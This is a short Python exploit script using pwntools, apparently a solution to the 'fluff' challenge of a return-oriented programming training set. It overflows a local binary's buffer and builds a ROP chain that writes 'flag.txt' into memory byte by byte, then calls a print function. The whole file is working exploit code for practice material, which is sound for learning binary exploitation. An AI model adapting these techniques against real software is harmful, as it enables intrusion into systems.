from pwn import *

#conn = gdb.debug('./fluff')
conn = process('./fluff')

elf = ELF('./fluff')
rop = ROP(elf)

file_name = [b'\x0b', b'f', b'l', b'a', b'g', b'.', b't', b'x', b't']
char_addr = [0x4003c4, 0x4003c1, 0x400411, 0x4003cf, 0x400434, 0x4003e0, 0x400246, 0x4003e0]

payload = b'A'*0x28

for i in range(1, len(file_name)):
    payload += p64(0x40062a)
    payload += p64(0x4000)
    payload += p64(char_addr[i-1] - 0x3ef2 - int.from_bytes(file_name[i-1], 'little'))
    payload += p64(0x400628)
    payload += p64(rop.rdi.address)
    payload += p64(0x601028 + i - 1)
    payload += p64(0x400639)

payload += p64(rop.rdi.address)
payload += p64(0x601028)
payload += p64(0x400620)

conn.sendlineafter('> ', payload)
conn.interactive()